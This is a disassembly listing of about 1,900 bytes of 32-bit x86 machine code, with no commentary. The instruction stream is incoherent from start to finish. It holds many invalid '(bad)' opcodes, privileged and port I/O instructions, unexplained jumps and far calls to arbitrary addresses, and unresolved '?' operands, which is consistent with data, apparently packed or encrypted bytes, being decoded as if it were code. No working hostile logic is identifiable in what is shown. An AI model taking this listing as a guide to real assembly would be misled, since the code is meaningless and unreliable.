  40372a:	stc    
  40372b:	imul   edi,edi,0xffffff88
  40372e:	xlat   BYTE PTR ds:[ebx]
  40372f:	pop    edi
  403730:	dec    esi
  403731:	ins    DWORD PTR es:[edi],dx
  403732:	mov    dl,bh
  403734:	adc    BYTE PTR ds:0x94ed0635,ah
  40373a:	ret    
  40373b:	loope  0x403784
  40373d:	scas   eax,DWORD PTR es:[edi]
  40373e:	sbb    eax,0x7ba3905f
  403743:	mov    dh,0x8f
  403745:	mov    ds:0xec05450a,eax
  40374a:	pop    esp
  40374b:	xchg   DWORD PTR [esi-0x22],edx
  40374e:	jmp    0x624a3103
  403753:	jp     0x403793
  403755:	sbb    eax,0x4a3e92a8
  40375a:	mov    ebp,edx
  40375c:	mov    ebx,0x86a2cd95
  403761:	mov    al,BYTE PTR [edi]
  403763:	fimul  DWORD PTR [eax+ecx*2]
  403766:	push   ecx
  403767:	dec    edi
  403768:	adc    al,BYTE PTR [ebp+0x49fba699]
  40376e:	and    al,0x64
  403770:	stc    
  403771:	and    BYTE PTR [ebx+0xe],ah
  403774:	repz sub DWORD PTR ds:0x25a71de3,eax
  40377b:	mov    esp,0x1b53df0f
  403780:	ins    BYTE PTR es:[edi],dx
  403781:	push   esi
  403782:	xor    ch,BYTE PTR [ebp+0x6e]
  403785:	and    ecx,DWORD PTR [ebx+0xd4a984a]
  40378b:	jmp    0x4037b1
  40378d:	outs   dx,DWORD PTR ds:[esi]
  40378e:	mov    ebp,0x691a4f59
  403793:	lods   eax,DWORD PTR ds:[esi]
  403794:	mov    edx,0xc7e08e0e
  403799:	icebp  
  40379a:	inc    edx
  40379b:	(bad)  
  40379c:	mov    ds:0x6910e9bf,al
  4037a1:	daa    
  4037a2:	jo     0x4037a6
  4037a4:	push   ecx
  4037a5:	xchg   esp,eax
  4037a6:	jns    0x403746
  4037a8:	push   esi
  4037a9:	and    BYTE PTR [ebp+0x3af32b1c],0xf8
  4037b0:	mov    cl,0xd3
  4037b2:	sub    ecx,ecx
  4037b4:	and    DWORD PTR [edi-0x20],ebx
  4037b7:	jmp    0x4037ac
  4037b9:	push   ebx
  4037ba:	mov    bl,0x6d
  4037bc:	mov    esi,0x4adc9d4a
  4037c1:	jmp    0x77e82c7f
  4037c6:	les    ecx,FWORD PTR [edx-0x74]
  4037c9:	fisub  WORD PTR [edi+0x7cf15ff8]
  4037cf:	jecxz  0x403784
  4037d1:	jmp    0x52aa:0x2939b36b
  4037d8:	or     dx,sp
  4037db:	xchg   esp,eax
  4037dc:	cmp    al,0x9e
  4037de:	clc    
  4037df:	mov    al,0x46
  4037e1:	stos   DWORD PTR es:[edi],eax
  4037e2:	hlt    
  4037e3:	pop    ebp
  4037e4:	xchg   edi,eax
  4037e5:	add    al,0x50
  4037e7:	jo     0x4037f6
  4037e9:	lods   al,BYTE PTR ds:[esi]
  4037ea:	pusha  
  4037eb:	sub    BYTE PTR [edi+ebx*2-0x41],bl
  4037ef:	ret    
  4037f0:	push   es
  4037f1:	jle    0x403783
  4037f3:	mov    ds:0x3f418219,eax
  4037f8:	int    0x13
  4037fa:	xchg   edx,eax
  4037fb:	dec    esp
  4037fc:	pop    esi
  4037fd:	push   ds
  4037fe:	mul    BYTE PTR [edx]
  403800:	addr16 test eax,0xf38b13e3
  403806:	push   ds
  403807:	mov    cs,WORD PTR [ecx]
  403809:	dec    esp
  40380a:	scas   al,BYTE PTR es:[edi]
  40380b:	mov    ecx,DWORD PTR [edx]
  40380d:	cs clc 
  40380f:	jge    0x4037bf
  403811:	mov    dl,BYTE PTR [ebx+0x5f43bd8e]
  403817:	dec    BYTE PTR [eax-0x45]
  40381a:	mov    ah,0x66
  40381c:	repnz les ecx,FWORD PTR ds:0xfaccbe05
  403823:	and    dh,BYTE PTR [ecx-0x1e32746f]
  403829:	dec    ebx
  40382a:	pop    ds
  40382b:	mov    cl,0x48
  40382d:	push   cs
  40382e:	xlat   BYTE PTR ds:[ebx]
  40382f:	jbe    0x403844
  403831:	sub    esi,esi
  403833:	mov    eax,0xb0d561aa
  403838:	test   al,0x3d
  40383a:	inc    edi
  40383b:	enter  0xb219,0x42
  40383f:	js     0x403802
  403841:	fild   WORD PTR [ebp+0x785b0193]
  403847:	jl     0x403848
  403849:	lahf   
  40384a:	xor    BYTE PTR [esi+esi*4+0x2a868031],al
  403851:	fadd   QWORD PTR [eax+ebx*4+0x1b749429]
  403858:	stos   BYTE PTR es:[edi],al
  403859:	xor    edx,ebx
  40385b:	outs   dx,BYTE PTR ds:[esi]
  40385c:	push   ecx
  40385d:	mov    dh,0x91
  40385f:	xchg   esi,eax
  403860:	aad    0xe6
  403862:	push   0xdda3e2ae
  403867:	xor    al,0x2f
  403869:	int    0x80
  40386b:	push   0x10
  40386d:	and    BYTE PTR [ecx+0x2d2e1340],bl
  403873:	xlat   BYTE PTR ds:[ebx]
  403874:	jecxz  0x403817
  403876:	mov    cl,0x2d
  403878:	mov    eax,0x55746b6d
  40387d:	push   esi
  40387e:	iret   
  40387f:	pop    esi
  403880:	jmp    0x725b4bbc
  403885:	aam    0x93
  403887:	(bad)  
  403889:	ret    0x97a1
  40388c:	(bad)  
  40388d:	xchg   edi,eax
  40388e:	xchg   esi,eax
  40388f:	enter  0xfcc6,0x81
  403893:	add    al,0xd7
  403895:	pop    esp
  403896:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403897:	or     ah,dh
  403899:	xchg   edi,eax
  40389a:	xchg   edi,eax
  40389b:	sbb    al,0x74
  40389d:	inc    edx
  40389e:	test   eax,0xeb94db23
  4038a3:	push   esi
  4038a4:	sbb    eax,0x4d927799
  4038a9:	jmp    0x37411633
  4038ae:	lods   al,BYTE PTR ds:[esi]
  4038af:	dec    ecx
  4038b0:	add    ebx,ebp
  4038b2:	lahf   
  4038b3:	stos   DWORD PTR es:[edi],eax
  4038b4:	xlat   BYTE PTR ds:[ebx]
  4038b5:	les    eax,FWORD PTR [edi+0x1b5fa9ce]
  4038bb:	aas    
  4038bc:	leave  
  4038bd:	aam    0x4e
  4038bf:	mov    ecx,0xafde06f2
  4038c4:	(bad)  
  4038c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4038c6:	xchg   ebx,eax
  4038c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4038c8:	ret    
  4038c9:	aas    
  4038ca:	xchg   ebp,eax
  4038cb:	hlt    
  4038cc:	cdq    
  4038cd:	repnz cld 
  4038cf:	jmp    0x40386d
  4038d1:	mov    esi,0xee423959
  4038d6:	push   es
  4038d7:	xchg   esp,eax
  4038d8:	ret    0xc15
  4038db:	pop    ecx
  4038dc:	xchg   esp,eax
  4038dd:	leave  
  4038de:	push   0xffffff99
  4038e0:	pop    ds
  4038e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4038e2:	jmp    0x3973:0x7961a2d6
  4038e9:	inc    eax
  4038ea:	and    BYTE PTR [esi],al
  4038ec:	xor    ch,BYTE PTR [edx]
  4038ee:	mov    eax,ds:0xf7ddfecf
  4038f3:	adc    BYTE PTR [esi+0x1f8df85e],bl
  4038f9:	shl    DWORD PTR [eax],1
  4038fb:	inc    edi
  4038fc:	sub    esi,eax
  4038fe:	inc    eax
  4038ff:	dec    esp
  403900:	lahf   
  403901:	xchg   ebx,eax
  403902:	aas    
  403903:	cld    
  403904:	out    dx,al
  403905:	sub    DWORD PTR [edi+0x77],0x14
  403909:	sbb    DWORD PTR ds:0x569aafb2,ebx
  40390f:	jae    0x40389c
  403911:	jl     0x403991
  403913:	add    al,0x8e
  403915:	sti    
  403916:	push   0x884ff72b
  40391b:	and    al,0x2d
  40391d:	push   edi
  40391e:	jmp    0xc093c553
  403923:	push   esi
  403924:	or     eax,0xed2fa2aa
  403929:	mov    esi,0x3d36be01
  40392e:	xchg   edi,eax
  40392f:	mov    ecx,0x6071bab4
  403934:	test   DWORD PTR [eax-0x18],edi
  403937:	cmp    esp,esi
  403939:	jp     0x403934
  40393b:	inc    ebp
  40393c:	jmp    0x6e79d5b9
  403941:	hlt    
  403942:	aas    
  403943:	fstp   TBYTE PTR ds:0x8b8099b7
  403949:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40394a:	test   DWORD PTR [edi+0x17],ebx
  40394d:	in     al,dx
  40394e:	add    DWORD PTR [ecx],ebp
  403950:	(bad)  
  403951:	rcl    bh,0x75
  403954:	nop
  403955:	test   cl,dh
  403957:	lods   al,BYTE PTR ds:[esi]
  403958:	ret    0x7181
  40395b:	jle    0x403942
  40395d:	mov    DWORD PTR [ecx-0x52],esp
  403960:	pop    ecx
  403961:	or     dl,BYTE PTR [edx+0x602967ad]
  403967:	mov    esp,0xc12b1266
  40396c:	arpl   WORD PTR [eax],cx
  40396e:	test   eax,0xc88f287a
  403973:	popf   
  403974:	jno    0x4039cb
  403976:	xchg   edx,eax
  403977:	pxor   mm2,QWORD PTR fs:[edi+0xef6e9af]
  40397f:	(bad)  
  403980:	adc    DWORD PTR [edx+0x40],esi
  403983:	pop    esi
  403984:	xor    al,0x5b
  403986:	add    eax,0x336257d0
  40398b:	mov    ch,0xe7
  40398d:	sbb    al,0x34
  40398f:	retf   
  403990:	cmp    BYTE PTR [ebx-0x45],0x6
  403994:	jns    0x4039e8
  403996:	xchg   edi,esp
  403998:	sbb    al,0xde
  40399a:	into   
  40399b:	xor    BYTE PTR [edx+0x3d],dl
  40399e:	mov    esi,0xd43b5892
  4039a3:	imul   ebp,DWORD PTR [ecx-0x3c],0x2b
  4039a7:	popa   
  4039a8:	mov    DWORD PTR [edi+0x1fe42835],0xdf50c8fa
  4039b2:	es loop 0x4039ec
  4039b5:	xor    ecx,DWORD PTR [eax-0x1a]
  4039b8:	call   0xe5b26750
  4039bd:	scas   al,BYTE PTR es:[edi]
  4039be:	jns    0x4039c0
  4039c0:	lods   al,BYTE PTR ds:[esi]
  4039c1:	cwde   
  4039c2:	lahf   
  4039c3:	dec    eax
  4039c4:	ja     0x403a0d
  4039c6:	cmp    BYTE PTR [esi-0x17f6deb1],ch
  4039cc:	adc    BYTE PTR [ebx-0x79],dh
  4039cf:	adc    DWORD PTR [esi+0x21],edi
  4039d2:	dec    edx
  4039d3:	ret    
  4039d4:	mov    ds:0xb1650044,al
  4039d9:	cli    
  4039da:	pop    esp
  4039db:	mov    ebp,0x42478a99
  4039e0:	scas   al,BYTE PTR es:[edi]
  4039e1:	clc    
  4039e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039e3:	mov    ch,0xc5
  4039e5:	sbb    al,0x3f
  4039e7:	or     al,0x5a
  4039e9:	into   
  4039ea:	(bad)  
  4039ec:	mov    cl,BYTE PTR [ebp-0x44]
  4039ef:	push   cs
  4039f0:	test   BYTE PTR [edi+0x5e6451c2],bl
  4039f6:	mov    ds:0x3e1a0dd8,al
  4039fb:	cmp    ebp,edx
  4039fd:	mov    ebp,0xeea7c9f5
  403a02:	cwde   
  403a03:	inc    esp
  403a05:	push   esp
  403a06:	push   es
  403a07:	test   BYTE PTR [edx],0xf7
  403a0a:	imul   esi,DWORD PTR [esi+0x142a99a1],0x6b
  403a11:	or     al,0x37
  403a13:	pop    ss
  403a14:	inc    esi
  403a15:	jg     0x403a5c
  403a17:	jecxz  0x403a00
  403a19:	mov    bh,0xcf
  403a1b:	mov    ecx,0xb69a39cb
  403a20:	adc    eax,0x91fca779
  403a25:	add    BYTE PTR [ecx],ah
  403a27:	lahf   
  403a28:	data16 sbb ah,BYTE PTR [ebx-0x1e928066]
  403a2f:	or     DWORD PTR [ebx-0x4c],esp
  403a32:	push   esp
  403a33:	dec    esp
  403a34:	xchg   ebx,eax
  403a35:	push   ecx
  403a36:	jne    0x403a14
  403a38:	(bad)  
  403a39:	dec    ecx
  403a3a:	fcmove st,st(4)
  403a3c:	repz add edx,ebx
  403a3f:	scas   eax,DWORD PTR es:[edi]
  403a40:	adc    al,0x54
  403a42:	jle    0x403aae
  403a44:	jo     0x4039c8
  403a46:	pop    ebp
  403a47:	mov    WORD PTR [edi+ecx*4],fs
  403a4a:	pop    ebx
  403a4b:	ins    BYTE PTR es:[edi],dx
  403a4c:	das    
  403a4d:	jmp    0x83b81bd2
  403a52:	mov    edi,0x64d0d800
  403a57:	imul   edx,ebp,0xd9acfc42
  403a5d:	push   eax
  403a5e:	clc    
  403a5f:	mov    eax,DWORD PTR [eax+eax*1+0x78]
  403a63:	adc    BYTE PTR [esi-0x11],dl
  403a66:	ins    BYTE PTR es:[edi],dx
  403a67:	and    BYTE PTR [edi-0x4cbdbbe0],dl
  403a6d:	data16 jae 0x403ae9
  403a70:	xlat   BYTE PTR ds:[ebx]
  403a71:	sub    ebx,DWORD PTR [ebp-0xd]
  403a74:	xchg   ecx,eax
  403a75:	mov    al,0xc6
  403a77:	jno    0x403acf
  403a79:	scas   eax,DWORD PTR es:[edi]
  403a7a:	sub    al,0x4e
  403a7c:	mov    esp,0x789a5621
  403a81:	and    esp,edx
  403a83:	mov    ah,0x1e
  403a85:	xchg   ah,bl
  403a87:	imul   DWORD PTR [edi]
  403a89:	sbb    al,0xcc
  403a8b:	jge    0x403af6
  403a8d:	dec    eax
  403a8e:	mov    WORD PTR ds:0x876e43ef,?
  403a94:	xor    BYTE PTR [eax+ebp*8+0x6c70c0c6],ah
  403a9b:	stc    
  403a9c:	sbb    cl,BYTE PTR [ebp-0x3d48a5d1]
  403aa2:	es adc eax,0x467c66d6
  403aa8:	xchg   ebx,eax
  403aa9:	pushf  
  403aaa:	mov    ds,ebp
  403aac:	clc    
  403aad:	jg     0x403a89
  403aaf:	out    dx,eax
  403ab0:	fnstsw WORD PTR [ecx]
  403ab2:	ret    
  403ab3:	dec    edi
  403ab4:	mov    ecx,ebp
  403ab6:	mov    DWORD PTR [eax-0x1],eax
  403ab9:	inc    edx
  403aba:	daa    
  403abb:	sbb    al,0x80
  403abd:	xchg   esi,eax
  403abe:	dec    edx
  403abf:	push   esi
  403ac0:	mov    bl,BYTE PTR [eax]
  403ac2:	xchg   esi,eax
  403ac3:	pop    ebx
  403ac4:	xchg   esi,eax
  403ac5:	and    DWORD PTR [edx+ebp*1+0x3b],esi
  403ac9:	outs   dx,BYTE PTR ds:[esi]
  403aca:	jno    0x403ae2
  403acc:	add    DWORD PTR [edi-0x465d2139],edx
  403ad2:	xor    eax,0x38da1ab1
  403ad7:	push   esp
  403ad8:	js     0x403aa2
  403ada:	push   eax
  403adb:	push   ss
  403adc:	xchg   edx,eax
  403add:	mov    WORD PTR [edi+0x17],gs
  403ae0:	enter  0x44bf,0xe7
  403ae4:	or     edi,DWORD PTR [esi]
  403ae6:	xor    DWORD PTR [ecx-0x1f],eax
  403ae9:	jmp    0x78222747
  403aee:	pop    esp
  403aef:	sti    
  403af0:	fmulp  st(7),st
  403af2:	sub    bh,BYTE PTR [edi+0x7d]
  403af5:	(bad)  
  403af6:	mov    cl,0x85
  403af8:	in     eax,dx
  403af9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403afa:	jecxz  0x403ac5
  403afc:	or     al,0x52
  403afe:	ja     0x403b30
  403b00:	mov    edi,0xd3a53bd7
  403b05:	cmp    edi,DWORD PTR [ebp+0x1f]
  403b08:	call   0x4a7e2706
  403b0d:	out    dx,al
  403b0e:	jns    0x403b6c
  403b10:	call   0x3416:0x20415793
  403b17:	push   edi
  403b18:	mov    DWORD PTR [edi+ecx*2],eax
  403b1b:	test   ch,ch
  403b1d:	inc    ebp
  403b1e:	push   cs
  403b1f:	mov    al,0x37
  403b21:	icebp  
  403b22:	push   eax
  403b23:	sti    
  403b24:	jb     0x403b3a
  403b26:	out    0xfe,al
  403b28:	jmp    0x403b74
  403b2a:	popa   
  403b2b:	lea    ecx,[edi+eax*4-0x2]
  403b2f:	add    BYTE PTR [edx+0x49094e47],bl
  403b35:	push   0x2b04ba2b
  403b3a:	push   ebp
  403b3b:	push   0xffffff86
  403b3d:	outs   dx,DWORD PTR ds:[esi]
  403b3e:	xchg   dl,dh
  403b40:	sbb    al,0x96
  403b42:	and    BYTE PTR [edi],cl
  403b44:	scas   eax,DWORD PTR es:[edi]
  403b45:	scas   eax,DWORD PTR es:[edi]
  403b46:	mov    eax,ds:0xb94c24a2
  403b4b:	mov    ebx,0x616390f1
  403b50:	mov    al,0x37
  403b52:	mov    bh,0xd
  403b54:	mov    ss,ebx
  403b56:	mov    eax,0x758ded1e
  403b5b:	not    esi
  403b5d:	in     al,dx
  403b5e:	leave  
  403b5f:	cmc    
  403b60:	div    dl
  403b62:	mov    dl,0xfb
  403b64:	popa   
  403b65:	test   edi,ebp
  403b67:	mov    eax,ds:0xbb595cb6
  403b6c:	call   0x4701:0x399bfad2
  403b73:	sbb    DWORD PTR [edi+0x49b2e69c],eax
  403b79:	push   es
  403b7a:	bound  esp,QWORD PTR [ebx-0x166f7646]
  403b80:	jmp    0x1ce02f1
  403b85:	popa   
  403b86:	inc    edi
  403b87:	ficom  WORD PTR [eax]
  403b89:	shr    BYTE PTR [esi-0x2ee288f3],1
  403b8f:	push   esi
  403b90:	daa    
  403b91:	pop    eax
  403b92:	inc    ecx
  403b93:	mov    bh,0x48
  403b95:	psubb  mm2,QWORD PTR [ecx]
  403b98:	dec    ebx
  403b99:	call   0xd721:0x48f687c2
  403ba0:	pushf  
  403ba1:	add    bl,BYTE PTR [ecx-0x55]
  403ba4:	inc    ebp
  403ba5:	jg     0x403c01
  403ba7:	xor    edi,DWORD PTR [ebx+eiz*8-0x6]
  403bab:	push   0xfffffff9
  403bad:	rol    BYTE PTR [esi+0x63],cl
  403bb0:	loopne 0x403b89
  403bb2:	adc    ebp,DWORD PTR [esi-0x13]
  403bb5:	imul   esp,DWORD PTR [edi-0x715f6ca9],0x8
  403bbc:	pushf  
  403bbd:	add    DWORD PTR gs:[esi],0xffffffa9
  403bc1:	or     BYTE PTR [ebp+0x4d],bh
  403bc4:	mov    ?,WORD PTR [si+0x1442]
  403bc9:	inc    edx
  403bca:	mov    BYTE PTR [esi+edi*8],ah
  403bcd:	or     dl,ah
  403bcf:	push   edx
  403bd0:	dec    esi
  403bd1:	mov    edi,0xd7d8e01e
  403bd6:	mov    cs,WORD PTR [esi]
  403bd8:	aam    0x47
  403bda:	mov    ds:0x86f3a0ae,al
  403bdf:	leave  
  403be0:	pop    edi
  403be1:	push   0xa100ac1b
  403be6:	mov    ds:0x3d6da36b,eax
  403beb:	hlt    
  403bec:	push   0xfffffff3
  403bee:	jnp    0x403c38
  403bf0:	loopne 0x403ba1
  403bf2:	sti    
  403bf3:	arpl   WORD PTR [ebx+0x1c],bx
  403bf6:	ins    BYTE PTR es:[edi],dx
  403bf7:	call   0x30736e6d
  403bfc:	test   eax,0x54b1b067
  403c01:	call   0x42b3a10e
  403c06:	sub    bl,al
  403c08:	mov    cs,WORD PTR [ebx]
  403c0a:	scas   al,BYTE PTR es:[edi]
  403c0b:	outs   dx,BYTE PTR ds:[esi]
  403c0c:	fnstsw WORD PTR [edx+ebp*8]
  403c0f:	cld    
  403c10:	push   edx
  403c11:	js     0x403ba9
  403c13:	lods   al,BYTE PTR ds:[esi]
  403c14:	(bad)  
  403c15:	popf   
  403c16:	not    dl
  403c18:	popf   
  403c19:	add    ecx,edi
  403c1b:	jl     0x403c70
  403c1d:	xchg   DWORD PTR fs:[edi-0x246b109d],ebx
  403c24:	cdq    
  403c25:	repz in al,0x31
  403c28:	ins    BYTE PTR es:[edi],dx
  403c29:	cmp    BYTE PTR ds:0x84a59cd7,dl
  403c2f:	(bad)  
  403c30:	sbb    al,0x7a
  403c32:	sar    DWORD PTR [edx],0xcb
  403c35:	push   esi
  403c36:	retf   0xc0b1
  403c39:	(bad)  
  403c3a:	shr    ecx,cl
  403c3c:	xchg   edi,eax
  403c3d:	jb     0x403ca0
  403c3f:	lds    ebx,FWORD PTR [ebp-0x55be1eba]
  403c45:	nop
  403c46:	(bad)  
  403c48:	daa    
  403c49:	push   0xd6202c31
  403c4e:	outs   dx,BYTE PTR ds:[esi]
  403c4f:	push   ss
  403c50:	fimul  WORD PTR [ecx+0x7d]
  403c53:	xchg   esi,eax
  403c54:	nop
  403c55:	adc    al,0x6b
  403c57:	stos   DWORD PTR es:[edi],eax
  403c58:	jle    0x403bfd
  403c5a:	pop    esi
  403c5b:	dec    ebx
  403c5c:	push   ecx
  403c5d:	sar    DWORD PTR [esi+0x20e38f00],cl
  403c63:	or     al,BYTE PTR [esi-0x3bccdc99]
  403c69:	fstp   QWORD PTR [esi]
  403c6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c6c:	dec    esp
  403c6d:	fsub   DWORD PTR [edx]
  403c6f:	mov    al,ds:0xeff700bc
  403c74:	pop    eax
  403c75:	(bad)  
  403c76:	into   
  403c77:	mov    ecx,0xcd51d478
  403c7c:	mov    ecx,0xfbc910c4
  403c81:	dec    ebp
  403c82:	std    
  403c83:	fild   QWORD PTR [ebp+0x4dd25ca9]
  403c89:	das    
  403c8a:	and    eax,0xc0af75cb
  403c8f:	cdq    
  403c90:	lock xor al,ah
  403c93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c94:	jbe    0x403c6a
  403c96:	mov    ch,0x8d
  403c98:	mov    BYTE PTR [ebp-0x6cbb2fb0],ch
  403c9e:	(bad)  
  403c9f:	sbb    cl,BYTE PTR [edi+esi*2]
  403ca2:	cmp    DWORD PTR [ecx-0x7b94e70f],esp
  403ca8:	je     0x403ccf
  403caa:	sahf   
  403cab:	div    edi
  403cad:	add    ebp,ebp
  403caf:	jmp    0x9c456454
  403cb4:	hlt    
  403cb5:	sub    esi,DWORD PTR [eax]
  403cb7:	(bad)  
  403cb8:	xor    al,0x39
  403cba:	cld    
  403cbb:	sub    eax,0xa605a0ba
  403cc0:	add    eax,0xa1ab1b32
  403cc5:	or     bl,BYTE PTR [edx+0x62d590e0]
  403ccb:	retf   
  403ccc:	call   0xfe42f7d8
  403cd1:	xor    DWORD PTR ds:0x727285af,0x6fe054e2
  403cdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cdc:	stc    
  403cdd:	jmp    0x1593bcb3
  403ce2:	cmc    
  403ce3:	mov    bh,0x78
  403ce5:	mov    ds:0x1c3fc1f1,eax
  403cea:	push   ds
  403ceb:	mov    al,BYTE PTR [ecx+0x6]
  403cee:	(bad)  
  403cef:	pusha  
  403cf0:	push   edx
  403cf1:	(bad)  
  403cf2:	xchg   edi,eax
  403cf3:	test   al,0x39
  403cf5:	push   cs
  403cf6:	into   
  403cf7:	in     al,dx
  403cf8:	retf   0x272d
  403cfb:	shr    BYTE PTR [eax-0x77f71685],1
  403d01:	mov    BYTE PTR [eax+ebx*8],cl
  403d04:	repnz in al,0x40
  403d07:	out    dx,al
  403d08:	sub    DWORD PTR [ebp+eiz*2-0x70],edx
  403d0c:	ins    DWORD PTR es:[edi],dx
  403d0d:	and    cl,BYTE PTR [ebx*1-0x6d13ce12]
  403d14:	das    
  403d15:	and    BYTE PTR [edi],ah
  403d17:	xor    eax,0xe7f5688a
  403d1c:	xchg   ecx,eax
  403d1d:	sti    
  403d1e:	inc    edi
  403d1f:	and    eax,0xfa2b2648
  403d24:	popf   
  403d25:	add    eax,DWORD PTR [edi-0x2a02c96d]
  403d2b:	cdq    
  403d2c:	cmp    ah,dl
  403d2e:	xlat   BYTE PTR ds:[ebx]
  403d2f:	ja     0x403cf7
  403d31:	sub    eax,0xb37bc5b0
  403d36:	mov    cl,0x55
  403d38:	std    
  403d39:	fild   WORD PTR [edx-0x7b24325a]
  403d3f:	ins    DWORD PTR es:[edi],dx
  403d40:	sbb    cl,BYTE PTR [esi]
  403d42:	inc    esi
  403d43:	and    ebp,DWORD PTR [ecx-0x54ff7c39]
  403d49:	jecxz  0x403cfe
  403d4b:	sbb    eax,0x82800d1
  403d50:	xchg   edi,eax
  403d51:	test   DWORD PTR [ebx-0x27],esi
  403d54:	leave  
  403d55:	mov    edx,ds
  403d57:	rcr    ebp,cl
  403d59:	push   esp
  403d5a:	scas   al,BYTE PTR es:[edi]
  403d5b:	stc    
  403d5c:	lea    esi,[esi-0x2c]
  403d5f:	shl    BYTE PTR [eax-0x5e],cl
  403d62:	pushf  
  403d63:	out    dx,eax
  403d64:	cld    
  403d65:	ins    BYTE PTR es:[edi],dx
  403d66:	mov    edx,0xd354e45e
  403d6b:	lods   eax,DWORD PTR ds:[esi]
  403d6c:	ret    
  403d6d:	sub    esi,DWORD PTR [ebp+0x3d]
  403d70:	ss inc eax
  403d72:	imul   ecx,ebp,0x9b59bf60
  403d78:	pop    ebp
  403d79:	jb     0x403d08
  403d7b:	fmulp  st(2),st
  403d7d:	int3   
  403d7e:	mov    ds:0x78e75d1e,al
  403d83:	repnz mov ecx,0xeff65a63
  403d89:	mov    ebx,0xacfe9054
  403d8e:	sbb    DWORD PTR es:[ebx+0x7f6a89c2],esi
  403d95:	stc    
  403d96:	imul   eax,DWORD PTR [esi-0x739734fd],0x19
  403d9d:	out    0x1a,eax
  403d9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403da0:	inc    ebp
  403da1:	and    DWORD PTR [edx],ebx
  403da3:	sahf   
  403da4:	and    ebp,DWORD PTR ds:0x96d78d60
  403daa:	or     DWORD PTR [edx+eax*4+0x38],esp
  403dae:	cmp    BYTE PTR [edx],dl
  403db0:	jbe    0x403db3
  403db2:	js     0x403de3
  403db4:	(bad)  
  403db5:	out    dx,eax
  403db6:	add    cl,BYTE PTR [ebx-0x49b538c8]
  403dbc:	xor    al,0x35
  403dbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403dbf:	repz sbb al,0xa7
  403dc2:	int    0xfd
  403dc4:	inc    DWORD PTR [ebp+0x2438ec1c]
  403dca:	push   eax
  403dcb:	cs xchg edx,eax
  403dcd:	jae    0x403d77
  403dcf:	shl    ah,0x6c
  403dd2:	adc    ah,BYTE PTR [ebp+ebp*1-0x3a]
  403dd6:	inc    esi
  403dd7:	mov    ah,0x6b
  403dd9:	popf   
  403dda:	inc    ebx
  403ddb:	sbb    DWORD PTR [eax],ecx
  403ddd:	test   DWORD PTR [ebp+ebx*2+0x2e1d8f01],0xc415698e
  403de8:	aad    0x88
  403dea:	jo     0x403e20
  403dec:	ret    0xebb8
  403def:	shl    DWORD PTR [ecx+0x2953963e],cl
  403df5:	(bad)  
  403df6:	scas   al,BYTE PTR es:[edi]
  403df7:	add    esp,DWORD PTR [esi+0x2b8733c2]
  403dfd:	xchg   ebx,eax
  403dfe:	sar    bl,0xaf
  403e01:	inc    edi
  403e02:	in     eax,dx
  403e03:	aad    0xc2
  403e05:	xchg   edx,eax
  403e06:	arpl   WORD PTR [eax],cx
  403e08:	mov    ?,WORD PTR [ecx-0x16]
  403e0b:	aas    
  403e0c:	ja     0x403e72
  403e0e:	mov    ds:0x68431209,al
  403e13:	xchg   ebp,eax
  403e14:	push   es
  403e15:	jle    0x403ddc
  403e17:	ins    BYTE PTR es:[edi],dx
  403e18:	adc    eax,0xab1660e9
  403e1d:	xchg   BYTE PTR [eax-0x6b],ah
  403e20:	mov    edi,0x7f83f1ab
  403e25:	(bad)  
  403e26:	rcr    bl,0xee
  403e29:	xor    bl,dh
  403e2b:	cmc    
  403e2c:	repnz hlt 
  403e2e:	bnd jns 0x403e13
  403e31:	mov    ds:0x8ef5001c,eax
  403e36:	xor    BYTE PTR [ebx-0x270db944],dh
  403e3c:	mov    al,0x39
  403e3e:	mov    cl,0x5d
  403e40:	test   al,0x7a
  403e42:	sub    al,0x40
  403e44:	dec    ebx
  403e45:	inc    edx
  403e46:	icebp  
  403e47:	mov    ecx,0xc852645c
  403e4c:	aas    
  403e4d:	xchg   DWORD PTR fs:[ecx-0x2],esp
  403e51:	xor    cl,BYTE PTR [eax+esi*4+0xd67f417]
  403e58:	jns    0x403ed0
  403e5a:	and    DWORD PTR [ecx],ecx
  403e5c:	ret    0xa3ff
  403e5f:	pop    edx
  403e60:	clc    
  403e61:	xchg   edx,eax
  403e62:	not    dl
  403e64:	pop    ss
  403e65:	sub    DWORD PTR [ebp+0x77df2140],ecx
  403e6b:	inc    edi
  403e6c:	xlat   BYTE PTR ds:[ebx]
  403e6d:	leave  
  403e6e:	imul   esp,DWORD PTR [esp+eax*4+0x51],0x58
  403e73:	js     0x403e23
  403e75:	in     al,dx
  403e76:	jmp    0x403e36
  403e78:	adc    DWORD PTR [ebp-0x1a],0xffffffa4
  403e7c:	call   0xc545:0x251b6cd2
  403e83:	push   ebp
  403e84:	mov    DWORD PTR [edi+0x11b465cf],ebx
  403e8a:	(bad)  
  403e8c:	cwde   
  403e8d:	aas    
  403e8e:	retf   0x3fee
  403e91:	jle    0x403e2f
  403e93:	test   eax,0x714c8ace
  403e98:	repz sub al,cl
  403e9b:	ins    DWORD PTR es:[edi],dx
  403e9c:	retf   
  403e9d:	mov    BYTE PTR [edx+0x6672fda2],bh
  403ea3:	std    
  403ea4:	push   0xffffffc7
  403ea6:	and    BYTE PTR [edi-0x37],0x26
  403eaa:	jecxz  0x403e8d
  403eac:	dec    esi
  403ead:	add    eax,0xa67a2df2
  403eb2:	push   eax
  403eb3:	loopne 0x403f1d
  403eb5:	sbb    BYTE PTR [edx-0x43e5c5d2],bl
  403ebb:	fwait
  403ebc:	mov    eax,0x3af3bd00
  403ec1:	ds (bad) 
  403ec3:	lock pop ecx
  403ec5:	outs   dx,BYTE PTR ds:[esi]
  403ec6:	ror    ebx,cl
  403ec8:	dec    ebx
  403ec9:	cdq    
  403eca:	or     al,BYTE PTR ds:0x1c124dca
  403ed0:	fdivr  st,st(4)
  403ed2:	imul   BYTE PTR [ebp+0x56]
  403ed5:	call   0x9c30:0xfa4627e
